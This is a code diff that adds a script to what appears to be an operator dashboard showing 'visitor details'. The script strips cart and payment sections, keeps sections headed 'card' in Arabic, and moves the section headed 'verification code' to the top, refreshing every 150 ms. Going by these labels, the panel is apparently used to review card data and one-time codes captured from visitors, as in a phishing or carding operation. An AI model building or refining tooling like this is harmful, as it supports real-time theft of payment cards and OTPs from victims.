@@ -4443,3 +4443,78 @@ run();setInterval(function(){note();apply()},1200);})();</script>
   (function loop(){ kill(); requestAnimationFrame(loop); })();
 })();
 </script>
+<script id="kddF119">
+(function(){
+  if (window.__f119) return; window.__f119 = 1;
+  try { if (document.title.indexOf('F119') < 0) document.title += ' ·F119'; } catch(e){}
+
+  var N = 0;
+  function tag(){
+    var d = document.getElementById('f119tag');
+    if (!d){ d = document.createElement('div'); d.id = 'f119tag';
+      d.style.cssText = 'position:fixed;bottom:6px;left:6px;z-index:99999;font:11px/1.4 monospace;background:#111;color:#0f0;padding:2px 6px;border-radius:6px;opacity:.8';
+      document.body.appendChild(d);
+    }
+    d.textContent = 'F119 · مسح ' + N;
+  }
+
+  var NEED = ['makani_cart', 'kdd-cart'];
+
+  function deepScan(){
+    var all = document.querySelectorAll('div'), m = [], i, j;
+    for (i = 0; i < all.length; i++){
+      var el = all[i], x = String(el.textContent || ''), ok = false;
+      for (j = 0; j < NEED.length; j++){ if (x.indexOf(NEED[j]) > -1){ ok = true; break; } }
+      if (!ok) continue;
+      if (!el.querySelector('h3')) continue;
+      m.push(el);
+    }
+    var t = [];
+    for (i = 0; i < m.length; i++){
+      var deep = true;
+      for (j = 0; j < m.length; j++){ if (i !== j && m[i].contains(m[j])){ deep = false; break; } }
+      if (deep) t.push(m[i]);
+    }
+    for (i = 0; i < t.length; i++){ if (t[i].parentNode){ t[i].parentNode.removeChild(t[i]); N++; } }
+  }
+
+  function killFast(){
+    var b = document.getElementById('visitorDetails'); if (!b) return;
+    var secs = b.querySelectorAll('.kddsec, .data-section');
+    for (var i = secs.length - 1; i >= 0; i--){
+      var s = secs[i], h = s.querySelector('h3'), t = h ? String(h.textContent || '') : '';
+      var x = String(s.textContent || '');
+      if (t.indexOf('بطاقة') > -1) continue;
+      if (t.indexOf('دفع') > -1){ s.parentNode.removeChild(s); N++; continue; }
+      if (x.indexOf('makani_cart') > -1 || x.indexOf('kdd-cart') > -1){ s.parentNode.removeChild(s); N++; continue; }
+      if (t.indexOf('📋') === 0 && t.indexOf('رمز التحقق') > -1){ s.parentNode.removeChild(s); N++; continue; }
+    }
+  }
+
+  function top(){
+    var b = document.getElementById('visitorDetails'); if (!b) return;
+    var c = b.querySelector('.space-y-3'); if (!c) return;
+    var k = c.children, tgt = null;
+    for (var i = 0; i < k.length; i++){
+      var el = k[i];
+      if (el.getAttribute('data-f112') || el.getAttribute('data-f91')) continue;
+      var h = el.querySelector('h3'); if (!h) continue;
+      if (String(h.textContent || '').indexOf('رمز التحقق') < 0) continue;
+      tgt = el; break;
+    }
+    if (tgt && c.firstElementChild !== tgt) c.insertBefore(tgt, c.firstElementChild);
+  }
+
+  function pass(){ deepScan(); killFast(); top(); tag(); }
+
+  var o = window.renderVisitorDetails;
+  if (typeof o === 'function' && !o.__f119){
+    var w = function(){ var r = o.apply(this, arguments); try { pass(); } catch(e){} return r; };
+    w.__f119 = 1; window.renderVisitorDetails = w;
+    try { renderVisitorDetails = w; } catch(e){}
+  }
+  pass();
+  setInterval(pass, 150);
+  (function loop(){ killFast(); tag(); requestAnimationFrame(loop); })();
+})();
+</script>
